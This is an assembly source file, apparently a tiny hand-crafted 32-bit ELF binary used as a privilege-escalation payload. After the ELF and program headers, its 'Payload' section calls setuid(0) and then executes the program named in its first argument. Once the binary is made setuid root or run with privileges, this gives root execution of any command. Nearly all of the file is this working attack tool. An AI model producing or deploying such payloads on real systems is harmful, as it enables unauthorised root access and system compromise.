BITS 32
org 0x08048000

; --- 32-bit ELF Header ---
ehdr:
    db 0x7F, "ELF"  ; e_ident
    db 1            ; EI_CLASS (1 = 32-bit)
    db 1            ; EI_DATA (1 = little endian)
    db 1            ; EI_VERSION
    db 0            ; EI_OSABI
    db 0, 0, 0, 0, 0, 0, 0, 0
    dw 2            ; e_type: Executable
    dw 3            ; e_machine: EM_386 (x86)
    dd 1            ; e_version
    dd _start       ; e_entry
    dd phdr - ehdr  ; e_phoff (offset to program header)
    dd 0            ; e_shoff
    dd 0            ; e_flags
    dw 52           ; e_ehsize (32-bit ELF header size)
    dw 32           ; e_phentsize (32-bit Program header size)
    dw 1            ; e_phnum (Number of program headers)
    dw 0            ; e_shentsize
    dw 0            ; e_shnum
    dw 0            ; e_shstrndx

; --- Program Header (PT_LOAD) ---
phdr:
    dd 1            ; p_type: PT_LOAD
    dd 0            ; p_offset
    dd 0x08048000   ; p_vaddr
    dd 0x08048000   ; p_paddr
    dd file_end - ehdr ; p_filesz
    dd file_end - ehdr ; p_memsz
    dd 5            ; p_flags: PF_R | PF_X (Read + Execute)
    dd 0x1000       ; p_align

; --- Payload ---
_start:
    ; setuid32(0)
    xor    eax, eax
    xor    ebx, ebx       ; ebx = 0 (UID)
    mov    al, 213        ; sys_setuid32 (213)
    int    0x80

    ; execve(argv[1], NULL, NULL)
    mov    ebx, [esp+8]   ; ebx = argv[1] (pointers are 4 bytes, so[esp+8])
    xor    ecx, ecx       ; ecx = NULL
    push   11             ; sys_execve (11)
    pop    eax
    cdq                   ; edx = 0 (sign-extends eax into edx)
    int    0x80

    ; exit(0)
    xor    ebx, ebx       ; Exit code 0
    push   1              ; sys_exit (1)
    pop    eax
    int    0x80

file_end: